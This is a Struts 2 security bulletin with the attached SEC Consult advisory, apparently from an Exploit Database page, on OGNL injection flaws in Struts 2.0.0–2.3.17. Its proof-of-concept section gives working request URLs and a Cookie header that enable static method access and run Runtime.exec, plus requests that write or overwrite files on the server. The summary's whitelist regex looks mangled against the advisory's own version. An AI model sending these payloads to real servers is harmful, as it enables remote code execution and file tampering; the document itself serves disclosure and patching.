## Summary

| Who should read this | All Struts 2 developers |
| --- | --- |
| Impact of vulnerability | Remote command execution and arbitrary file overwrite, Strict DMI does not work correctly |
| Maximum security rating | Critical |
| Recommendation | Developers should immediately upgrade to at least [Struts 2.3.18](http://struts.apache.org/download.cgi#struts2311) or read the following solution instructions carefully for a configuration change to mitigate the vulnerability |
| Affected Software | Struts 2.0.0 - Struts 2.3.17 |
| Original JIRA Ticket | [WW-3729](https://issues.apache.org/jira/browse/WW-3729) |
| Reporter | Johannes Dahse, SEC Consult Vulnerability Lab and Bruce Phillips (blog post) |
| CVE Identifier | CVE-2012-0391, CVE-2012-0392, CVE-2012-0393, CVE-2012-0394 |
| Original Description | [Reported directly to security@struts.a.o](https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt) and [Struts 2 Security Vulnerability - Dynamic Method Invocation](http://www.brucephillips.name/blog/index.cfm/2011/2/19/Struts-2-Security-Vulnerability--Dynamic-Method-Invocation) |

## Problem

To prevent attackers calling arbitrary methods within parameters the flag `xwork.MethodAccessor.denyMethodExecution` is set to `true` and the `SecurityMemberAccess` field `allowStaticMethodAccess` is set to `false` by default. Also, to prevent access to context variables an improved character whitelist for parameter names is applied in the `ParameterInterceptor` since Struts 2.2.1.1:

`acceptedParamNames = "[a-zA-Z0-9\.][()_']+";`

Under certain circumstances these restrictions can be bypassed to execute malicious Java code.

1. **Remote command execution in Struts <= 2.2.3 (`ExceptionDelegator`)**
   When an exception occurs while applying parameter values to properties, the value is evaluated as an OGNL expression. For example, this occurs when setting a string value to an integer property. Since the values are not filtered an attacker can abuse the power of the OGNL language to execute arbitrary Java code leading to remote command execution. This issue has been reported (<https://issues.apache.org/jira/browse/WW-3668>) and was fixed in Struts 2.2.3.1. However the ability to execute arbitrary Java code has been overlooked.
2. **Remote command execution in Struts <= 2.3.1 (`CookieInterceptor`)**
   The character whitelist for parameter names is not applied to the `CookieInterceptor`. When Struts is configured to handle cookie names, an attacker can execute arbitrary system commands with static method access to Java functions. Therefore the flag `allowStaticMethodAccess` can be set to true within the request.
3. **Arbitrary File Overwrite in Struts <= 2.3.1 (`ParameterInterceptor`)**
   While accessing the flag `allowStaticMethodAccess` within parameters is prohibited since Struts 2.2.3.1 an attacker can still access public constructors with only one parameter of type String to create new Java objects and access their setters with only one parameter of type String. This can be abused in example to create and overwrite arbitrary files. To inject forbidden characters into a filename an uninitialized string property can be used.
4. **Remote command execution in Struts <= 2.3.17 (`DebuggingInterceptor`)**
   While not being a security vulnerability itself, please note that applications running in developer mode and using the `DebuggingInterceptor` are prone to remote command execution as well. While applications should never run in developer mode during production, developers should be aware that doing so not only has performance issues (as documented) but also a critical security impact.

## Solution

**It is strongly recommended to upgrade to [Struts 2.3.18](http://struts.apache.org/download.cgi#struts2311) or higher****, which contains the corrected classes.**

Update to Struts 2.3.18 and apply a stronger `acceptedParamNames` filter to the `ParameterInterceptor` and `CookieInterceptor`:

`acceptedParamNames = "[a-zA-Z0-9\.][()_']+";`

=======================================================================

Vendor description:
-------------------
Apache Struts2 is a web framework for creating Java web applications. It is
using the OpenSymphony XWork and OGNL libraries. By default, XWork's
ParametersInterceptor treats parameter names provided to actions as OGNL
expressions. A OGNL (Object Graph Navigation Language) expression is a limited
language similar to Java that is tokenized and parsed by the OGNL parser which
invokes appropiate Java methods. This allows e.g. convenient access to
properties that have a getter/setter method implemented. By providing a
parameter like "product.id=1" the OGNL parser will call the appropiate setter
getProduct().setId(1) in the current action context. OGNL is also able to call
arbitrary methods, constructors and access context variables. For more details
please refer to http://commons.apache.org/ognl/language-guide.html.

Vulnerability overview/description:
-----------------------------------
To prevent attackers calling arbitrary methods within parameters the flag
"xwork.MethodAccessor.denyMethodExecution" is set to "true" and the
SecurityMemberAccess field "allowStaticMethodAccess" is set to "false" by
default. Also, to prevent access to context variables an improved character
whitelist for paramteter names is applied in XWork's ParametersInterceptor since
Struts 2.2.1.1:

acceptedParamNames = "[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+";

Under certain circumstances these restrictions can be bypassed to execute
malicious Java code.

1.) Remote command execution in Struts <= 2.2.1.1 (ExceptionDelegator)

When an exception occurs while applying parameter values to properties the
value is evaluated as OGNL expression. For example this occurs when setting a
string value to a property with type integer. Since the values are not
filtered an attacker can abuse the power of the OGNL language to execute
arbitrary Java code leading to remote command execution. This issue has been
reported (https://issues.apache.org/jira/browse/WW-3668) and was fixed in
Struts 2.2.3.1. However the ability to execute arbitrary Java code has been
overlooked.

2.) Remote command execution in Struts <= 2.3.1 (CookieInterceptor)

The character whitelist for parameter names is not applied to Struts
CookieInterceptor. When Struts is configured to handle cookie names, an
attacker can execute arbitrary system commands with static method access to
Java functions. Therefore the flag "allowStaticMethodAccess" can be set to
true within the request.

3.) Arbitrary File Overwrite in Struts <= 2.3.1 (ParametersInterceptor)

Accessing the flag "allowStaticMethodAccess" within parameters is prohibited
since Struts 2.2.3.1. An attacker can still access public constructors with
only one parameter of type String to create new Java objects and access their
setters with only one parameter of type String. This can be abused for example
to create and overwrite arbitrary files. To inject forbidden characters to the
filename an uninitialized string property can be used.

4.) Remote command execution in Struts <= 2.3.1 (DebuggingInterceptor)

While not being a security vulnerability itself, please note that applications
running in developer mode and using Struts DebuggingInterceptor are prone to
remote command execution as well. While applications should never run in
developer mode during production, developers should be aware that doing so not
only has performance issues (as documented) but also a critical security
impact.

Proof of concept:
-----------------

1.) Remote command execution in Struts <= 2.2.1.1 (ExceptionDelegator)

Given Test.java has an property "id" of type Integer or Long and appropriate
getter and setter methods:
	long id;

Given test.jsp with result name=input is configured for action "Test":
struts.xml:
	<action name="Test" class="example.Test">
		<result name="input">test.jsp</result>
	</action>

The following request will trigger an exception, the value will be evaluated
as OGNL expression and arbitrary Java code can be executed:

	/Test.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter("C:/wwwroot/sec-consult.jsp")).append("jsp+shell").close())%2b'

An attacker can	also overwrite flags that will allow direct OS command execution:
	/Test.action?id='%2b(%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b'

If test.jsp displays the property "id" the result of the Java code evaluation
can be accessed:
	<%@ taglib prefix="s" uri="/struts-tags" %>
	<s:property value="id" />

2.) Remote command execution in Struts <= 2.3.1 (CookieInterceptor)

Given struts.xml is configured to handle all cookie names (independent of
limited cookie values):
	<action name="Test" class="example.Test">
		<interceptor-ref name="cookie">
			<param name="cookiesName">*</param>
			<param name="cookiesValue">1,2</param>
		</interceptor-ref>
		<result ...>
	</action>

The following HTTP header will execute an OS command when sent to Test.action:
	Cookie: (#_memberAccess["allowStaticMethodAccess"]\u003dtrue)(x)=1; x[@java.lang.Runtime@getRuntime().exec('calc')]=1

3.) Arbitrary File Overwrite in Struts <= 2.3.1 (ParametersInterceptor)

Given Test.java has an uninitialized property "name" of type String:
	String name; // +getter+setter

The following request will create/overwrite the file "C:/sec-consult.txt"
(empty file):
	/Test.action?name=C:/sec-consult.txt&x[new+java.io.FileWriter(name)]=1

The existence of the property 'x' used in these examples is of no importance.

4.) Remote command execution in Struts <= 2.3.1 (DebuggingInterceptor)

Given struts.xml is configured to run in developer mode and to use the
debugging interceptor:
	<constant name="struts.devMode" value="true" />
	<action name="Test" class="example.Test">
		<interceptor-ref name="debugging" />
		<result ...>
	</action>

The following request will execute arbitrary OGNL expressions leading to remote command execution:
	/Test.action?debug=command&expression=%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc')

Vulnerable / tested versions:
-----------------------------
All products using Struts2 are affected by at least one critical vulnerability
listed above!

Proof of Concept 1.) has been tested with Jetty-6.1.25 26 July 2010 and Struts
2.2.1.1

Proof of Concepts 2.), 3.) and 4.) have been tested with Jetty-6.1.25 26 July 2010
and Struts 2.2.1.1, 2.2.3.1 and 2.3.1

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
